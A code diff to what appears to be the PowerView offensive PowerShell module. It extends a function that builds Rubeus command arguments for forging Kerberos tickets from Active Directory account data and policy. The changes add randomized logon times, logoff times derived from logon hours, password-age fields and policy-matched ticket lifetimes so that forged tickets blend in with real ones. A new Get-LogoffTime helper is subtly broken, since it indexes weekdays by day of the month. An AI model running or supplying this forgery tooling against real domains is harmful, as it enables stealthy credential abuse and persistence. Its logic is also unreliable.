@@ -23997,6 +23997,8 @@ Convert logonhours LDAP attribute from byte array to readable string.
 
 .PARAMETER LogonHours
 
+Byte array of the users logon hours.
+
 .EXAMPLE
 
 Convert-LogonHours -LogonHours $LogonHours
@@ -24009,7 +24011,7 @@ Byte[]
 
 PSObject
 #>
-    [OutputType('String')]
+    [OutputType([PSObject])]
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
@@ -24143,7 +24145,7 @@ String
 String
 
 #>
-    [OutputType([PSObject])]
+    [OutputType('String')]
     [CmdletBinding()]
     Param (
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -24275,8 +24277,14 @@ String
             $NetbiosFilter = "(&(netbiosname=*)(dnsroot=$Domain))"
             $NetbiosName = (Get-DomainObject -SearchBase "$ConfigDN" -LdapFilter "$NetbiosFilter" @SearcherArguments).netbiosname
 
+            # get time now for logontime and logofftime
+            $Now = Get-Date
+
             # we have everything we can start to build the arguments
-            $OutArguments = "/user:$($Account.samaccountname) /id:$AccountID /sid:$DomainSID /netbios:$NetbiosName /dc:$($DomainObject.DomainControllers[0].Name) /domain:$Domain /pgid:$($Account.primarygroupid) /uac:$($Account.useraccountcontrol -replace ' ','') /displayname:""$($Account.displayname)"" /logoncount:$($Account.logoncount) /badpwdcount:$($Account.badpwdcount) /pwdlastset:""$($Account.pwdlastset.ToString())"""
+            $OutArguments = "/user:$($Account.samaccountname) /id:$AccountID /sid:$DomainSID /netbios:$NetbiosName /dc:$($DomainObject.DomainControllers[0].Name) /domain:$Domain /pgid:$($Account.primarygroupid) /displayname:""$($Account.displayname)"" /logoncount:$($Account.logoncount) /badpwdcount:$($Account.badpwdcount) /pwdlastset:""$($Account.pwdlastset.ToString())"" /lastlogon:""$($Now.AddSeconds(-$(Get-Random -Maximum 10)))"""
+            if ($Account.useraccountcontrol -ne "NORMAL_ACCOUNT") {
+                $OutArguments += " /uac:$($Account.useraccountcontrol -replace ' ','')"
+            }
             if ($Groups.Length -gt 0) {
                 $OutArguments += " /groups:$($Groups -join ',')"
             }
@@ -24292,17 +24300,142 @@ String
             if ($Account.homedirectory) {
                 $OutArguments += " /homedir:""$($Account.homedirectory)""" 
             }
-            if ($Account.lastlogon -notmatch 1601) {
-                $OutArguments += " /lastlogon:""$($Account.lastlogon.ToString())"""
+            if ($Account.logonhours) {
+                $LogoffTime = Get-LogoffTime -LogonHours $Account.logonhours -LogonTime $Now
+                if ($LogoffTime -and $LogoffTime -ne $Now) {
+                    $OutArguments += " /logofftime:""$($LogoffTime.AddMinutes(-$LogoffTime.Minute).AddSeconds(-$LogoffTime.Second))"""
+                }
             }
-
-
-
+            elseif ($LogoffTime -eq $Now) {
+                Write-Warning "[Get-RubeusForgeryArgs] User is not allowed to login now!"
+            }
+            if ($DomainPolicy.SystemAccess.MinimumPasswordAge -gt 0) {
+                $OutArguments += " /minpassage:$($DomainPolicy.SystemAccess.MinimumPasswordAge)"
+            }
+            # only set PasswordMustChange if policy is set to expire password and user isn't configured so password doesn't expire
+            if ($DomainPolicy.SystemAccess.MaximumPasswordAge -gt 0 -and $Account.useraccountcontrol -notmatch "DONT_EXPIRE_PASSWORD") {
+                $OutArguments += " /maxpassage:$($DomainPolicy.SystemAccess.MaximumPasswordAge)"
+            }
+            # in Protected Users group with time endtime and renewtill of 240 minutes
+            if ($Groups.Contains("525")) {
+                $OutArguments += " /endtime:240m /renewtill:240m"
+            }
+            else {
+                $OutArguments += " /endtime:$($DomainPolicy.KerberosPolicy.MaxTicketAge)h /renewtill:$($DomainPolicy.KerberosPolicy.MaxRenewAge)d"
+            }
 
             $OutArguments
         }
     }
 }
+
+function Get-LogoffTime {
+<#
+.SYNOPSIS
+
+Calculate the proper logoff time for a user given the logonhours field and the current time.
+
+Author: Charlie Clark (@exploitph)
+License: BSD 3-Clause
+Required Dependencies: 
+
+.DESCRIPTION
+
+Calculate the proper logoff time for a user given the logonhours field and the current time.
+
+.PARAMETER LogonHours
+
+Logon hours object output by Convert-LogonHours
+
+.PARAMETER LogonTime
+
+Logon time for ticket
+
+.EXAMPLE
+
+Get-LogoffTime -LogonHours $LogonHours -LogonTime $(Get-Date)
+
+.INPUTS
+
+PSObject
+
+.OUTPUTS
+
+DateTime
+#>
+    [OutputType([DateTime])]
+    [CmdletBinding()]
+    Param(
+        [ValidateNotNullOrEmpty()]
+        $LogonHours,
+
+        [DateTime]
+        $LogonTime
+    )
+
+    BEGIN {
+        $Days = @{
+            1 = "Sunday";
+            2 = "Monday";
+            3 = "Tuesday";
+            4 = "Wednesday";
+            5 = "Thursday";
+            6 = "Friday";
+            7 = "Saturday";
+        }
+    }
+
+    PROCESS {
+        $Hour = $LogonTime.Hour
+        $Day = $Days[$LogonTime.Day]
+        if (-not $LogonHours.$Day.$Hour) {
+            Write-Verbose "[Get-LogoffTime] User is not allowed to logon now!"
+            $LogonTime
+        }
+        $OutTime = $LogonTime
+        $leftover = 23 - $Hour
+        $FoundLogoff = $False
+        for ($i=0; $i -lt 7; $i++) {
+            $Day = $Days[$($LogonTime.Day + $i)]
+            if ($i -eq 0) {
+                $counter = $Hour + 1
+            }
+            else {
+                $counter = 0
+            }
+            do {
+                $OutTime = $OutTime.AddHours(1)
+                if (-not $LogonHours.$Day.$counter) {
+                    $FoundLogoff = $True
+                    break
+                }
+                $counter += 1
+            } while ($counter -lt 24)
+            if ($FoundLogoff) {
+                break
+            }
+        }
+
+        if (-not $FoundLogoff -and $Hour -gt 0) {
+            $Day = $Days[$LogonTime.Day]
+            for ($i=0; $i -lt $Hour; $i++) {
+                $OutTime = $OutTime.AddHours(1)
+                if (-not $LogonHours.$Day.$i) {
+                    $FoundLogoff = $True
+                    break
+                }
+            }
+        }
+
+        if ($FoundLogoff) {
+            $OutTime
+        }
+        else {
+            $FoundLogoff
+        }
+    }
+}
+
 
 
 ########################################################
